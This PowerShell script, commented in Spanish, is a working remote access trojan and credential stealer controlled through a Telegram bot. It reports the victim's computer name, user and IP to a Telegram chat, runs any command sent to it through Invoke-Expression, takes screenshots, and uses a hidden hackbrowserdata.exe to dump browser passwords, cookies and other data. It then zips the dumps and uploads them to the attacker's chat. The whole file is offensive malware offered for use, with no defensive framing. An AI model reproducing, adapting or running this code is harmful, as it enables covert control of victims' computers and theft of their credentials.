param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)] 
    [string]$ChatId
)

$ErrorActionPreference = 'Continue'
$ApiUrl = "https://api.telegram.org/bot$Token"
$LogFile = Join-Path $env:APPDATA 'CarpetaDos\bot.log'
$HackPath = Join-Path $env:APPDATA 'CarpetaDos\hackbrowserdata.exe'

New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue
    Write-Host $line
}

# Desactivar webhook y limpiar updates pendientes
try {
    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post -ErrorAction Stop | Out-Null
    Write-Log "Webhook desactivado"
    Start-Sleep -Seconds 3
} catch {
    Write-Log "Error desactivando webhook: $($_.Exception.Message)"
}

Add-Type -AssemblyName System.Windows.Forms, System.Drawing, System.Net.Http

$httpClient = New-Object System.Net.Http.HttpClient

function Send-Message {
    param([string]$Text, [string]$TargetChatId = $ChatId)
    try {
        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
        
        $json = @{chat_id=$TargetChatId; text=$Text} | ConvertTo-Json -Compress
        $content = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
        $response = $httpClient.PostAsync("$ApiUrl/sendMessage", $content).Result
        
        $content.Dispose()
        if (-not $response.IsSuccessStatusCode) {
            Write-Log "Error sendMessage: $($response.StatusCode)"
        }
        return $response.IsSuccessStatusCode
    } catch {
        Write-Log "Error Send-Message: $($_.Exception.Message)"
        return $false
    }
}

function Send-File {
    param(
        [string]$Path, 
        [string]$Caption="", 
        [string]$TargetChatId = $ChatId
    )
    
    try {
        if (-not (Test-Path $Path)) {
            Write-Log "Archivo no existe: $Path"
            return $false
        }
        
        $fileInfo = Get-Item $Path
        if ($fileInfo.Length -gt 49MB) {
            Write-Log "Archivo muy grande: $($fileInfo.Length)"
            Send-Message -Text "Archivo muy grande: $($fileInfo.Name)" -TargetChatId $TargetChatId
            return $false
        }
        
        # Crear contenido multipart correctamente para PowerShell 5.1
        $content = New-Object System.Net.Http.MultipartFormDataContent
        
        # Agregar chat_id
        $chatIdContent = New-Object System.Net.Http.StringContent($TargetChatId)
        $content.Add($chatIdContent, "chat_id")
        
        # Agregar caption si existe
        if ($Caption) {
            $captionContent = New-Object System.Net.Http.StringContent($Caption)
            $content.Add($captionContent, "caption")
        }
        
        # Agregar archivo
        $fileBytes = [System.IO.File]::ReadAllBytes($Path)
        $fileContent = New-Object System.Net.Http.ByteArrayContent($fileBytes)
        $fileContent.Headers.ContentDisposition = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue("form-data")
        $fileContent.Headers.ContentDisposition.Name = "document"
        $fileContent.Headers.ContentDisposition.FileName = $fileInfo.Name
        $content.Add($fileContent, "document")
        
        # Enviar
        $response = $httpClient.PostAsync("$ApiUrl/sendDocument", $content).Result
        
        $content.Dispose()
        
        if (-not $response.IsSuccessStatusCode) {
            $errorBody = $response.Content.ReadAsStringAsync().Result
            Write-Log "Error enviando archivo $($fileInfo.Name): $($response.StatusCode) - $errorBody"
            return $false
        }
        
        Write-Log "Archivo enviado OK: $($fileInfo.Name)"
        return $true
        
    } catch {
        Write-Log "Error Send-File: $($_.Exception.Message)"
        return $false
    }
}

function Get-Info {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "Desconocida" }
    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip"
}

function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        
        $path = Join-Path $env:TEMP "screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        $result = Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        Remove-Item $path -Force -ErrorAction SilentlyContinue
        return $result
    } catch {
        Write-Log "Error screenshot: $($_.Exception.Message)"
        return $false
    }
}

function Run-Steal {
    param([string]$TargetChatId = $ChatId)
    
    Send-Message -Text "Extrayendo datos..." -TargetChatId $TargetChatId
    Write-Log "Iniciando extraccion"
    
    if (-not (Test-Path $HackPath)) {
        Send-Message -Text "Error: hackbrowserdata.exe no encontrado" -TargetChatId $TargetChatId
        return
    }
    
    $outputDir = Join-Path $env:TEMP "browser_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    
    try {
        # Ejecutar SIN --zip para obtener archivos sueltos
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $HackPath
        $psi.Arguments = "dump -d `"$outputDir`" -f json"
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = 'Hidden'
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit(180000)
        
        if (-not $proc.HasExited) {
            $proc.Kill()
            Send-Message -Text "Timeout en extraccion" -TargetChatId $TargetChatId
            return
        }
        
        $stderr = $proc.StandardError.ReadToEnd()
        if ($stderr) { Write-Log "HackBrowserData: $stderr" }
        
        # Buscar JSONs
        $jsonFiles = Get-ChildItem -Path $outputDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
        
        if (-not $jsonFiles) {
            Send-Message -Text "No se generaron archivos JSON" -TargetChatId $TargetChatId
            Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
            return
        }
        
        Write-Log "Encontrados $($jsonFiles.Count) archivos JSON"
        $sent = 0
        
        foreach ($json in $jsonFiles) {
            try {
                # Comprimir individualmente
                $zipPath = Join-Path $env:TEMP "$($json.BaseName).zip"
                
                if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
                
                Compress-Archive -Path $json.FullName -DestinationPath $zipPath -Force -CompressionLevel Optimal
                
                # Renombrar caption (quitar .json)
                $caption = $json.BaseName  # Esto quita la extension .json
                
                if (Send-File -Path $zipPath -Caption $caption -TargetChatId $TargetChatId) {
                    $sent++
                }
                
                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                Start-Sleep -Milliseconds 800  # Evitar rate limit
                
            } catch {
                Write-Log "Error procesando $($json.Name): $($_.Exception.Message)"
            }
        }
        
        Send-Message -Text "Extraccion completada. Enviados: $sent de $($jsonFiles.Count)" -TargetChatId $TargetChatId
        Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
        
    } catch {
        Write-Log "Error Run-Steal: $($_.Exception.Message)"
        Send-Message -Text "Error: $($_.Exception.Message)" -TargetChatId $TargetChatId
    }
}

function Execute-Cmd {
    param([string]$Command, [string]$TargetChatId = $ChatId)
    
    Write-Log "Ejecutando: $Command"
    
    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        
        if ([string]::IsNullOrWhiteSpace($output)) {
            $output = "(comando ejecutado sin salida)"
        }
        
        # Guardar en archivo temporal
        $tempFile = Join-Path $env:TEMP "cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $content = "Comando: $Command`nFecha: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$output"
        [System.IO.File]::WriteAllText($tempFile, $content, [System.Text.Encoding]::UTF8)
        
        # Enviar como archivo
        if (Send-File -Path $tempFile -Caption "Resultado de: $Command" -TargetChatId $TargetChatId) {
            # Enviar confirmacion breve
            $lines = $output -split "`n" | Where-Object { $_.Trim() } | Select-Object -First 3
            $preview = ($lines -join "`n")
            if ($preview.Length -gt 100) { $preview = $preview.Substring(0, 100) + "..." }
            Send-Message -Text "Comando ejecutado. Archivo enviado.`nPreview:`n$preview" -TargetChatId $TargetChatId
        }
        
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        
    } catch {
        Send-Message -Text "Error ejecutando comando: $($_.Exception.Message)" -TargetChatId $TargetChatId
    }
}

function Process-Command {
    param([string]$Text, [string]$FromChatId)
    
    Write-Log "Procesando: '$Text'"
    $cmd = $Text.Trim()
    $cmdLower = $cmd.ToLower()
    
    # Separar comando y argumentos
    if ($cmdLower -match '^(/?[a-z]+)\s*(.*)') {
        $baseCmd = $Matches[1]
        $args = $Matches[2].Trim()
    } else {
        return
    }
    
    switch ($baseCmd) {
        { $_ -in 'ls', '/ls' } {
            try {
                $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-Message -Text "Directorio: $(Get-Location)`n`n$items"
            } catch {
                Send-Message -Text "Error: $($_.Exception.Message)"
            }
        }
        
        { $_ -in 'cmd', '/cmd' } {
            if ($args) {
                Execute-Cmd -Command $args
            } else {
                Send-Message -Text "Uso: /cmd <comando>"
            }
        }
        
        { $_ -in 'cd', '/cd' } {
            if ($args) {
                try {
                    Set-Location $args -ErrorAction Stop
                    Send-Message -Text "Ahora en: $(Get-Location)"
                } catch {
                    Send-Message -Text "Error: No se pudo ir a '$args'"
                }
            } else {
                Send-Message -Text "Uso: /cd <ruta>"
            }
        }
        
        { $_ -in 'pwd', '/pwd' } {
            Send-Message -Text "Directorio: $(Get-Location)"
        }
        
        { $_ -in 'steal', '/steal' } {
            Run-Steal
        }
        
        { $_ -in 'captura', '/captura' } {
            Send-Message -Text "Capturando..."
            if (-not (Take-Screenshot)) {
                Send-Message -Text "Error al capturar"
            }
        }
        
        { $_ -in 'info', '/info' } {
            Send-Message -Text (Get-Info)
        }
        
        { $_ -in 'help', '/help' } {
            Send-Message -Text @'
Comandos:
/ls - Listar archivos
/cmd <comando> - Ejecutar (resultado en .txt)
/cd <ruta> - Cambiar directorio
/pwd - Directorio actual
/steal - Extraer datos (cada archivo comprimido individual)
/captura - Screenshot
/info - Info del sistema
/help - Esta ayuda
'@
        }
        
        default {
            Write-Log "Comando desconocido: $baseCmd"
        }
    }
}

# Inicio
Write-Log "=== BOT INICIADO ==="
Write-Log "ChatId: $ChatId"

Send-Message -Text "Bot online - $(Get-Info)"

$lastUpdateId = 0

while ($true) {
    try {
        $url = "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=5"
        $response = Invoke-RestMethod -Uri $url -TimeoutSec 60
        
        if ($response.ok -and $response.result.Count -gt 0) {
            foreach ($update in $response.result) {
                $lastUpdateId = $update.update_id
                $message = $update.message
                
                if ($null -eq $message -or [string]::IsNullOrEmpty($message.text)) { continue }
                
                $msgChatId = [string]$message.chat.id
                
                if ($msgChatId -eq $ChatId) {
                    Process-Command -Text $message.text -FromChatId $msgChatId
                } else {
                    Write-Log "Mensaje de otro chat: $msgChatId (esperado: $ChatId)"
                }
            }
        }
    } catch {
        $err = $_.Exception.Message
        if ($err -notlike "*409*") {
            Write-Log "Error bucle: $err"
        }
        Start-Sleep -Seconds 2
    }
    
    Start-Sleep -Milliseconds 500
}
